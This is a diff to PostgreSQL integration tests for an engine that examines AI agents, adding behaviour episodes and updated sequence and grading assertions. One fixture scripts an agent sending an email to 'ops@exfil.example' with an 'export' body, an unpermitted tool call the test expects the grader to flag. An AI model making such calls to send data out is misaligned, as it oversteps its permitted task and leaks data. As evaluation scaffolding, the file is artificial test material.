@@ -11,6 +11,11 @@ const candidate = require('../../curriculum-engine/examples/ai-safety-candidate'
 const { createStandardItems } = require('../standard-generator');
 const { generateStandardForm } = require('../generation');
 const { createPgStore } = require('../store');
+const { EPISODES_PER_ITEM } = require('../behaviour');
+// An answered attempt: the start event, 11 text responses, and for each of the 4
+// behaviour items one step per episode plus the Engine's response event.
+const ANSWERED_SEQUENCE = 1 + 11 + 4 * (EPISODES_PER_ITEM + 1);
+const EPISODE_KEY = 'postgres-integration-episode-seed-key-0123456789';
 
 if (!process.env.EXAMINATION_TEST_DATABASE_URL) throw new Error('EXAMINATION_TEST_DATABASE_URL required');
 test('PostgreSQL admission is atomic, immutable and stable across store restart', async () => {
@@ -80,9 +85,22 @@ function responseCommand(attempt, overrides = {}) {
     now: BEFORE_DEADLINE, correlationId: 'pg-response', ...overrides };
 }
 
-async function answerAll(ctx) {
+// Text items take a response; behaviour items are answered by recorded
+// episode steps, one finishing step per episode.
+// extraSteps(item, episode) gives actions to take before an episode's finish.
+async function answerAll(ctx, extraSteps = () => []) {
   let current = await ctx.store.get(ctx.attempt.attemptId);
   for (const [index, item] of current.form.items.entries()) {
+    if (item.kind === 'behaviour') {
+      for (let episode = 0; episode < EPISODES_PER_ITEM; episode += 1) {
+        const actions = [...extraSteps(item, episode), { finish: { message: `Private answer ${index + 1}` } }];
+        for (const [step, action] of actions.entries()) {
+          current = (await ctx.store.command(current.attemptId, { type: 'episode_step', idempotencyKey: `response-${index + 1}-${episode}-${step}`,
+            expectedSequence: current.sequence, itemId: item.id, action, now: BEFORE_DEADLINE, correlationId: 'pg-response' })).attempt;
+        }
+      }
+      continue;
+    }
     const result = await ctx.store.command(current.attemptId, responseCommand(current, {
       itemId: item.id, response: `Private response number ${index + 1} for review`, idempotencyKey: `response-${index + 1}`,
     }));
@@ -196,14 +214,14 @@ test('PostgreSQL finalization rollback leaves neither grade nor terminal event a
   try {
     await assert.rejects(ctx.store.command(ready.attemptId, command), /injected terminal failure/);
     const saved = await createPgStore(ctx.pool).get(ready.attemptId);
-    assert.deepEqual([saved.status, saved.sequence], ['in_progress', 16]);
+    assert.deepEqual([saved.status, saved.sequence], ['in_progress', ANSWERED_SEQUENCE]);
     assert.equal(saved.events.some((event) => event.eventType === 'grade_recorded'), false);
   } finally {
     await ctx.pool.query(`DROP TRIGGER ${name} ON examination_engine.attempt_events`);
     await ctx.pool.query(`DROP FUNCTION examination_engine.${name}()`);
   }
   const completed = await createPgStore(ctx.pool).command(ready.attemptId, command);
-  assert.deepEqual([completed.replay, completed.attempt.status, completed.attempt.sequence], [false, 'complete', 18]);
+  assert.deepEqual([completed.replay, completed.attempt.status, completed.attempt.sequence], [false, 'complete', ANSWERED_SEQUENCE + 2]);
 });
 
 test('PostgreSQL deadlines persist across restart but fully collected timely attempts may be graded later', async (t) => {
@@ -218,7 +236,7 @@ test('PostgreSQL deadlines persist across restart but fully collected timely att
   const afterRestart = createPgStore(completeCtx.pool);
   const stillWaiting = await afterRestart.command(ready.attemptId, { type: 'timeout', now: AFTER_DEADLINE,
     correlationId: 'pg-late-sweep' });
-  assert.deepEqual([stillWaiting.attempt.status, stillWaiting.attempt.sequence], ['in_progress', 16]);
+  assert.deepEqual([stillWaiting.attempt.status, stillWaiting.attempt.sequence], ['in_progress', ANSWERED_SEQUENCE]);
   const completed = await afterRestart.command(ready.attemptId, finalizeCommand(ready));
   assert.equal(completed.attempt.status, 'complete');
   const replay = await createPgStore(completeCtx.pool).get(ready.attemptId);
@@ -247,12 +265,12 @@ test('PostgreSQL grade, timeout and abort races leave exactly one terminal event
   const grade = finalizeCommand(gradeReady);
   await gradeCtx.store.command(gradeReady.attemptId, grade);
   const duplicate = await createPgStore(gradeCtx.pool).command(gradeReady.attemptId, { ...grade, idempotencyKey: 'duplicate-event' });
-  assert.deepEqual([duplicate.replay, duplicate.attempt.sequence], [true, 18]);
+  assert.deepEqual([duplicate.replay, duplicate.attempt.sequence], [true, ANSWERED_SEQUENCE + 2]);
   const foreign = await fixture(t);
   const foreignReady = await answerAll(foreign);
   await assert.rejects(foreign.store.command(foreignReady.attemptId, { ...finalizeCommand(foreignReady), eventId: grade.eventId }),
     (error) => error.status === 409);
-  assert.equal((await foreign.store.get(foreignReady.attemptId)).sequence, 16);
+  assert.equal((await foreign.store.get(foreignReady.attemptId)).sequence, ANSWERED_SEQUENCE);
 });
 
 test('PostgreSQL migration preserves an Issue 16 manifest and legacy sequence-one start event', async (t) => {
@@ -293,12 +311,15 @@ test('PostgreSQL keeps the assessment of a graded attempt and lists only ungrade
   const gradeItems = async ({ items }) => ({ ok: true, body: { grader: { id: 'pg-grader', version: '1.0.0' },
     results: items.map((item) => ({ itemId: item.itemId, score: item.tier === 'adversarial' ? 60 : 95,
       criticalViolationRuleIds: [], rationale: 'pg fixture', citedItemIds: [item.itemId] })) } });
-  const runner = createGradingRunner({ store: ctx.store, sources, gradeItems, clock: () => AFTER_DEADLINE });
+  const runner = createGradingRunner({ store: ctx.store, sources, gradeItems, clock: () => AFTER_DEADLINE, episodeSeedKey: EPISODE_KEY });
   const graded = await runner.grade(answered.attemptId, 'pg-grade');
   assert.deepEqual([graded.attempt.status, graded.attempt.terminalReason], ['agent_failed', 'valid_failing_result']);
+  // The behaviour evidence, re-read from jsonb, must still fit (keys come back reordered).
   const reread = await createPgStore(ctx.pool).get(answered.attemptId);
-  assert.deepEqual(reread.assessment.failureReasons, ['insufficient_adversarial_score']);
-  assert.equal(reread.assessment.tierPercents.adversarial, 60);
+  // Episodes that only finish complete no task, so the adversarial tier and the bounds fail.
+  assert.deepEqual(reread.assessment.failureReasons, ['insufficient_overall_score', 'insufficient_adversarial_score', 'insufficient_behaviour_bound']);
+  assert.equal(reread.assessment.tierPercents.adversarial, 0);
+  assert.equal(reread.assessment.behaviour.episodes.length, 4 * EPISODES_PER_ITEM);
   assert.ok(!(await ctx.store.listAwaitingGrading(1000)).includes(answered.attemptId));
   const replay = await runner.grade(answered.attemptId, 'pg-grade-again');
   assert.equal(replay.outcome, 'replay');
@@ -307,7 +328,9 @@ test('PostgreSQL keeps the assessment of a graded attempt and lists only ungrade
 test('PostgreSQL commits one immutable remediation event with a failure and keeps one final delivery', async (t) => {
   const { createGradingRunner } = require('../grading');
   const ctx = await fixture(t, { evidence: { mode: 'synthetic', environment: 'simulation' } });
-  const answered = await answerAll(ctx);
+  // In v2's first episode the agent calls a tool its task does not permit (critical-o4).
+  const answered = await answerAll(ctx, (item, episode) => (item.slotId === 'v2' && episode === 0
+    ? [{ tool: 'send_email', args: { to: 'ops@exfil.example', body: 'export' } }] : []));
   const pkg = structuredClone(candidate);
   pkg.packageId = pkg.manifest.packageId; pkg.version = pkg.manifest.version;
   pkg.state = 'Active'; pkg.digest = sha256(pkg); pkg.quarantinedScopes = []; pkg.certificationBlocked = false;
@@ -316,7 +339,7 @@ test('PostgreSQL commits one immutable remediation event with a failure and keep
   const gradeItems = async ({ items }) => ({ ok: true, body: { grader: { id: 'pg-grader', version: '1.0.0' },
     results: items.map((item) => ({ itemId: item.itemId, score: 95, rationale: 'pg fixture', citedItemIds: [item.itemId],
       criticalViolationRuleIds: item.tier === 'adversarial' ? ['critical-o4'] : [] })) } });
-  const runner = createGradingRunner({ store: ctx.store, sources, gradeItems, clock: () => AFTER_DEADLINE });
+  const runner = createGradingRunner({ store: ctx.store, sources, gradeItems, clock: () => AFTER_DEADLINE, episodeSeedKey: EPISODE_KEY });
   await runner.grade(answered.attemptId, 'pg-remediation');
   await runner.grade(answered.attemptId, 'pg-remediation-again');
   const restarted = createPgStore(ctx.pool);
@@ -371,7 +394,7 @@ test('PostgreSQL relay claims are exclusive, back off, and order equal timestamp
     const answered = await answerAll(ctx);
     const sources = { activePackage: async () => pkg,
       registration: async () => ({ configurationFingerprint: answered.configurationFingerprint }) };
-    await createGradingRunner({ store: ctx.store, sources, gradeItems, clock: () => AFTER_DEADLINE }).grade(answered.attemptId, 'pg');
+    await createGradingRunner({ store: ctx.store, sources, gradeItems, clock: () => AFTER_DEADLINE, episodeSeedKey: EPISODE_KEY }).grade(answered.attemptId, 'pg');
     failed.push({ ctx, attemptId: answered.attemptId });
   }
   const store = failed[0].ctx.store;
